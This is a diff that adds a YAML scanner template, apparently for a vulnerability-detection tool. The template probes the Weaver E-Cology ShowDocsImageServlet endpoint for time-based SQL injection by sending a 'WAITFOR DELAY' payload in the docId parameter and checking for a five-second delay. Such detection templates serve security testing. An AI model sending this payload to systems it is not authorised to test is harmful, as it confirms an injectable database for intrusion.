@@ -1,0 +1,11 @@
+name: 泛微E-Cology-ShowDocsImageServlet-SQL注入
+description: >
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+WAITFOR+DELAY+%270%3A0%3A5%27"
+    expression:
+      sleep: 5
+      body_all: ["JFIF"]
